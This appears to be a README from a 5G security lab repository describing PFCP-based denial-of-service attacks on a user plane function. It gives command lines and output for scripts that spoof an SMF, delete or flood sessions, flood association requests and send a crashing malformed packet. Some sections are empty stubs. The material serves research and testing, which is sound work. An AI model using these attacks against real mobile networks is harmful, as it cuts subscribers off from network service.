# PFCP based Attacks

## Table of Contents
1. [PFCP Based DOS Attacks](#dos)
	1. [Unauthorized PFCP Session Delete Request](#delete)
	2. [Session Modify to Drop](#moddrop)
  3. [Session Modify GNB address](#moddest)
2. [Crash UPF](#crash)
    1. [Flood Associate](#flood)
    2. [Malformed Modification Request](#malform)

## PFCP Based DOS Attacks <div id='dos'/>

These attacks are based on but not exactly the same as those of todo (cite pfcp paper) however instead of taking over the SMF we will just spoof an IP address and act as a second UPF that connects and then commits the unauthorized PFCP based attacks.

These attack work from either the UE or CORE vm you just need the UPF ip address. You only need to not use the same IP as the ligitimate SMF if you don't have the ability to stop the real SMF. Also you need to run and have scapy installed with root provalages to use the functionalities needed.

### Unauthorized PFCP Session Delete Request <div id='delete'/>

Here we connect to a or multiple UPFs and send unauothrized PFCP session delete requests. First we send an association request and then either flood SEIDs or target a specific SEID. Below you can see the standard use. 

```console
user@UE_VM||CORE_VM:~/5G/UE_VM/Exploit_Scripts/PFCP$ sudo python3 delete_pfcp_session.py -h
sudo python3 delete_pfcp_session.py -s <source_ip> -d <destination_ip> -t <target seid (optional else will flood)> -f <flood range>

user@UE_VM||CORE_VM:~/5G/UE_VM/Exploit_Scripts/PFCP$ sudo python3 delete_pfcp_session.py -s 10.0.14.10  -d 10.0.17.1 -t 3 #targeting the SEID on upf 10.0.17.1

.
Sent 1 packets.
Sending association request to UPF at:  10.0.17.1
.
Sent 1 packets.
Sending session delete request for SEID:  3  To upf:  10.0.17.1

user@UE_VM||CORE_VM:~/5G/UE_VM/Exploit_Scripts/PFCP$ sudo python3 delete_pfcp_session.py -s 10.0.14.10  -d 10.0.17.1,10.0.21.1 -f 0,3 #Flood seid 0-3 to both ips 10.0.17.1 and 10.0.21.1

.
Sent 1 packets.
Sending association request to UPF at:  10.0.17.1
.
Sent 1 packets.
Sending association request to UPF at:  10.0.21.1
.
Sent 1 packets.
Sending session delete request for SEID:  0  To upf:  10.0.17.1
.
Sent 1 packets.
Sending session delete request for SEID:  0  To upf:  10.0.21.1
.
Sent 1 packets.
Sending session delete request for SEID:  1  To upf:  10.0.17.1
.
Sent 1 packets.
Sending session delete request for SEID:  1  To upf:  10.0.21.1
.
Sent 1 packets.
Sending session delete request for SEID:  2  To upf:  10.0.17.1
.
Sent 1 packets.
Sending session delete request for SEID:  2  To upf:  10.0.21.1

```
Below you can see an example of a single UE being targeted and malicious user deletes their SEID, so that only one UE no longer has access to the data network.

![targeted seid](../../../Media/targeted_dos_from_ue.gif)


![Registerue](/5G/Media/regester_ue_upf_log.gif)

### Modify to Drop <div id='moddrop'/>

### Modify GNB address <div id='moddest'/>

## Crash UPF <div id='crash'/>


### Flood Associate DOS <div id='flood'/>

Another even simpler attack is to simply flood with association requests from different spoofed ips.

```console
user@UE_VM||CORE_VM:~/5G/UE_VM/Exploit_Scripts/DOS/PFCP$ sudo python3 flood_associate.py -d <target IP>
```

![flood associate](../../../Media/flood_associate_dos.gif)


## Malformed Packet DOS - todo check if spoof real smf ip works <div id='malform'/>

While investigating the other PFCP Dos attacks we found a malformed packet that leads to the upf service restarting and losing all UE data associated, thusly blocking all UE traffic.

```console
user@UE_VM||CORE_VM:~/5G/UE_VM/Exploit_Scripts/PFCP$ sudo python3 malformed_modify_pfcp_session.py -d <target IP>
```

![malformed dos](../../../Media/malformed_upf_dos.gif)

